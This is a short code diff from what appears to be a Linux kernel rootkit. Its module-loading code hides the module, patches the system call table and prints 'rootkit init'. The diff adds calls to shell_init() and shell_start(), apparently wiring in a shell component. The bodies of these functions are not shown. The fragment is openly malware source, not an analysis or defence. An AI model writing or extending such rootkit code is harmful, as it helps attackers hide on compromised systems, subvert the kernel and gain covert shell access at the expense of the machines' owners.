@@ -14,6 +14,7 @@ static int init_callback(void *data)
     msleep(1000);
     hide_module();
     utils_init();
+    shell_start();
     return 0;
 }
 
@@ -21,6 +22,7 @@ static int __init rootkit_init(void)
 {
     init_x64_sys_call();
     stop_machine(init_syscall_table, NULL, NULL);
+    shell_init();
     printk(KERN_ALERT "rootkit init\n");
     kthread_run(init_callback, NULL, "init_callback");
     return 0;
